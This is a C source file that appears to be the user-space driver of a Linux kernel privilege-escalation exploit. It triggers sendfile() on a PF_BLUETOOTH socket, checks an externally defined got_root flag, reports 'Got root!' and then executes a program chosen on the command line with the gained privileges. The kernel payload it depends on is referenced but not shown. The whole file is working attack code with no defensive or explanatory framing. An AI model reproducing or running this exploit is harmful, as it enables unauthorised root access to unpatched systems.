#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <fcntl.h>

extern int got_root;
extern int (*root_sendpage)();

static int do_get_root(char *template)
{
	int fdin, fdout;

	fdin = mkstemp(template);
	if (fdin < 0) return -1;

	if (unlink(template) < 0) return -1;
	if (ftruncate(fdin, PAGE_SIZE) < 0) return -1;

	fdout = socket(PF_BLUETOOTH, SOCK_DGRAM, 0);
	if (fdout < 0) return -1;

	sendfile(fdout, fdin, NULL, PAGE_SIZE);
	close(fdout);
	close(fdin);

	return 0;
}

int main(int argc, char *argv[])
{
	if (argc < 3) {
		fprintf(stderr, "ERROR: Bad arguments\n");
		return -1;
	}

	if (do_get_root(argv[1]) < 0) {
		fprintf(stderr, "FAILURE: Unable to setup.\n");
		return -1;
	}

	if (got_root == 1) {
		fprintf(stderr, "SUCCESS: Got root!\n");
	} else {
		fprintf(stderr, "FAILURE: Didn't get root.\n");
		return -1;
	}

	execv(argv[2], &argv[2]);
	return -1;
}
